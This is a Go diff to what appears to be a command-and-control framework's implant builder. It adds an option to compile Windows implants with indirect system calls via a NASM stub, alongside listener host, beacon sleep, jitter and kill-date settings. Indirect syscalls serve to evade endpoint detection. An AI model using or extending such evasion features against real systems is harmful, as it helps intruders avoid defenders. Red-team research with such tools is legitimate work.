@@ -21,20 +21,21 @@ type ImplantRequestPaths struct {
 }
 
 type Implant struct {
-	Id           uint
-	Uuid         string
-	Name         string
-	Os           string
-	Arch         string
-	Format       string
-	Lprotocol    string
-	Lhost        string
-	Lport        uint16
-	RequestPaths ImplantRequestPaths
-	Type         string // "beacon", "interactive"
-	Sleep        uint
-	Jitter       uint
-	KillDate     uint
+	Id               uint
+	Uuid             string
+	Name             string
+	Os               string
+	Arch             string
+	Format           string
+	Lprotocol        string
+	Lhost            string
+	Lport            uint16
+	RequestPaths     ImplantRequestPaths
+	Type             string // "beacon", "interactive"
+	Sleep            uint
+	Jitter           uint
+	KillDate         uint
+	IndirectSyscalls bool
 }
 
 func NewImplant(
@@ -51,6 +52,7 @@ func NewImplant(
 	sleep uint,
 	jitter uint,
 	killDate uint,
+	indirectSyscalls bool,
 ) *Implant {
 	if _uuid == "" {
 		_uuid = uuid.NewString()
@@ -60,19 +62,20 @@ func NewImplant(
 	}
 
 	return &Implant{
-		Id:        id,
-		Uuid:      _uuid,
-		Name:      name,
-		Os:        os,
-		Arch:      arch,
-		Format:    format,
-		Lprotocol: lprotocol,
-		Lhost:     lhost,
-		Lport:     lport,
-		Type:      impType,
-		Sleep:     sleep,
-		Jitter:    jitter,
-		KillDate:  killDate,
+		Id:               id,
+		Uuid:             _uuid,
+		Name:             name,
+		Os:               os,
+		Arch:             arch,
+		Format:           format,
+		Lprotocol:        lprotocol,
+		Lhost:            lhost,
+		Lport:            lport,
+		Type:             impType,
+		Sleep:            sleep,
+		Jitter:           jitter,
+		KillDate:         killDate,
+		IndirectSyscalls: indirectSyscalls,
 	}
 }
 
@@ -110,7 +113,7 @@ func (i *Implant) Generate(serverState *state.ServerState) (data []byte, outFile
 	reqPathSocketOpen := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/socket/open"])
 	reqPathSocketClose := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/socket/close"])
 
-	// Change to the paylaod directory
+	// Change to the payload directory
 	if i.Os == "linux" {
 		return nil, "", fmt.Errorf("linux target is not implemented yet")
 	} else if i.Os == "windows" {
@@ -122,8 +125,23 @@ func (i *Implant) Generate(serverState *state.ServerState) (data []byte, outFile
 			return nil, "", err
 		}
 
+		// Compile assembly
+		asmSrc := "src/asm/syscalls."
+		if i.Arch == "amd64" {
+			asmSrc += "x64.asm"
+		} else {
+			asmSrc += "x86.asm"
+		}
+		asmObj := fmt.Sprintf("/tmp/syscalls-%s.o", uuid.NewString())
+		_, err = meta.ExecCommand("nasm", "-f", "win64", "-o", asmObj, asmSrc)
+		if err != nil {
+			return nil, "", fmt.Errorf("nasm error: %v", err)
+		}
+
+		// Compile
 		_, err = meta.ExecCommand(
 			"cmake",
+			fmt.Sprintf("-DASM_OBJECT=%s", asmObj),
 			fmt.Sprintf("-DOUTPUT_DIRECTORY=%s", payloadsDir),
 			fmt.Sprintf("-DPAYLOAD_NAME=%s", i.Name),
 			fmt.Sprintf("-DPAYLOAD_ARCH=%s", i.Arch),
@@ -132,6 +150,7 @@ func (i *Implant) Generate(serverState *state.ServerState) (data []byte, outFile
 			fmt.Sprintf("-DPAYLOAD_SLEEP=%s", fmt.Sprint(i.Sleep)),
 			fmt.Sprintf("-DPAYLOAD_JITTER=%s", fmt.Sprint(i.Jitter)),
 			fmt.Sprintf("-DPAYLOAD_KILLDATE=%s", fmt.Sprint(i.KillDate)),
+			fmt.Sprintf("-DPAYLOAD_INDIRECT_SYSCALLS=%t", i.IndirectSyscalls),
 			fmt.Sprintf("-DLISTENER_PROTOCOL=\"%s\"", i.Lprotocol),
 			fmt.Sprintf("-DLISTENER_HOST=\"%s\"", i.Lhost),
 			fmt.Sprintf("-DLISTENER_PORT=%s", fmt.Sprint(i.Lport)),
@@ -158,7 +177,7 @@ func (i *Implant) Generate(serverState *state.ServerState) (data []byte, outFile
 		)
 		if err != nil {
 			os.Chdir(serverState.CWD)
-			return nil, "", fmt.Errorf("build error: %v", err)
+			return nil, "", fmt.Errorf("cmake error: %v", err)
 		}
 	}
 
